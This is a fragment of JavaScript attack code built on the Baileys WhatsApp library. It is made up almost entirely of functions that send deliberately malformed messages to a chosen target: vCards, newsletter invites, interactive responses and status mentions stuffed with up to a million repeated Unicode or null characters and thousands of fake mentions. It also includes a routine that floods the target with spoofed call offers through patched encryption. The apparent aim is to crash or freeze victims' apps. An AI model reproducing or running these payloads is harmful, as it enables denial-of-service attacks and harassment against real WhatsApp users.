                    remoteJid: "0@g.us",
                    fromMe: true,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            },
            hasMediaAttachment: true
          },
          body: {
            text: "HELLO"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦽ".repeat(10000),
                  flow_message_version: "3"
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦾ".repeat(10000),
                  flow_message_version: "3"
                })
              }
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000)
              },
              body: {
                text: "KILL YOU",
                format: "DEFAULT"
              }
            }
          }
        }
      }
    }
  });

  const statusJid = "status@broadcast";
  const msg = await generateWAMessageFromContent(statusJid, akhjx, { 
    userJid: sock.user.id 
  });
  
  await sock.relayMessage(statusJid, msg.message, { 
    messageId: msg.key.id 
  });
}

async function FriendBerulah(sock, target) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");
    const crypto = require("crypto");
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
    await sock.assertSessions(devices);
    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;
        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = bokep(
                    yntkts ? yntkts(msg) : encodeWAMessage(msg)
                );
                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });
                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );
        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase();
        let {
            nodes: destinations,
            shouldIncludeDeviceIdentity
        } = await sock.createParticipantNodes(
            devices,
            { conversation: "y" },
            { count: "0" }
        );
        const callOffer = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "offer",
                attrs: {
                    "call-id": callId,
                    "call-creator": sock.user.id
                },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
                    { tag: "net", attrs: { medium: "3" } },
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                    { tag: "encopt", attrs: { keygen: "2" } },
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }] : [])
                ]
            }]
        };
        
        await sock.sendNode(callOffer);
        await sleep(1000);
        const callTerminate = {
            tag: "call",
            attrs: {
                to: target,
                id: sock.generateMessageTag(),
                from: sock.user.id
            },
            content: [{
                tag: "terminate",
                attrs: {
                    "call-id": callId,
                    "reason": "REJECTED",
                    "call-creator": sock.user.id
                },
                content: []
            }]
        };
        
        await sock.sendNode(callTerminate);
        await sleep(1000);
    }
    console.log("Done");
}

async function invsNewIos(sock, target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function XCursedNFBlank(sock, target) {
  await sock.relayMessage(
    target,
    {
      newsletterAdminInviteMessage: {
        newsletterJid: "99999@newsletter",
        newsletterName: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅" + "ោ៝".repeat(30000),
        caption: "ꦾ".repeat(77777) + "ꦽ".repeat(25000),
        inviteExpiration: Date.now(),
        contextInfo: {
          isForwarded: true,
          forwardingScore: 99,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "\u0000",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: Buffer.from([0x00]),
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );
}

// delay
async function RaysDocuStunt(sock, target) {
 for (let i = 0; i < 2; i++) {
  await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "CsmX.zip",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "CsmX-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                  length: 2000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "CsmX.doc",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, {
        messageId: null,
        participant: { jid: jid }
    });
  }
  await new Promise((r) => setTimeout(r, 1500));
  await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "CosmoX.zip",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "CsmX-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                  length: 2000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "CsmX.doc",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, {
        messageId: null,
        participant: { jid: target }
    });
}

//lagi
async function xCursedCrott(sock, target) {
  for (let i = 0; i < 1000; i++) {
    const msg = await generateWAMessageFromContent(jid, {
      viewOnceMessagw: {
        message: {
          messageContextInfo: {
            deviceListMetada: {},
            deviceListMetadaVersion: 2
          },
          interactiveResponseMessage: {
            body: {
              text: "xCursed Crott Ahhh 🗿",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              fromMe: false,
              participant: jid,
              forwardingScore: 9999,
              isForwarded: true,
              entryPointConversionSource: "address_message",
            }
          }
        }
      }
    }, {});
    
    await sock.relayMessage(jid, {
      groupStatusMessageV2: {
       message: msg.message
      }
    }, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
    await new Promise((r) => setTimeout(r, 1000));
  }
}

//lagi
async function xCursedCrawl(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "@raysofbeam ( XcurseD )",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "review_and_pay",
            paramsJson: `{"currency":"USD","pay*ment_configuration":"","payment_type":"","transaction_id":"","total_amount":{"value":879912500,"offset":100},"reference_id":"4N88TZPXWUM","type":"physical-goods","payment_method":"","order":{"status":"pending","description":"","subtotal":{"value":990000000,"offset":100},"tax":{"value":8712000,"offset":100},"discount":{"value":118800000,"offset":100},"shipping":{"value":500,"offset":100},"order_type":"ORDER","items":[{"retailer_id":"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0","name":"COSMOX","amount":{"value":1000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4","name":"XCURSED","amount":{"value":5000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3","name":"null","amount":{"value":4000000,"offset":100},"quantity":99}]},"additional_note":${"\u0000".repeat(1000000)}}`,
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });
  
  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msg.message
    }
  }, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
  
  const msgs = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "xcursed - nothing",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `${"\x50".repeat(1045000)}`,
            version: 3
          },
          contextInfo: {
           mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ]          
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msgs.message
    }
  }, {
    messageId: msgs.key.id,
    participant: { jid: target }
  });
  
  const msgw = await generateWAMessageFromContent(target, {
    ephemeralMessage: {
      message: {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "CsmX is Back!",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1000000),
                version: 3
              },
              entryPointConversionSource: "payment_info"
            }
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msgw.message
    }
  }, {
    messageId: msgw.key.id,
    participant: { jid: target }
  });
}

async function delaybuld(sock, target) {
    const stickers = {
    stickerMessage: {
        url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
        fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
        fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
        mediaKey: Buffer.alloc(32, '').toString('base64'),
        mimetype: "image/webp",
        height: -1,
        width: 5000,
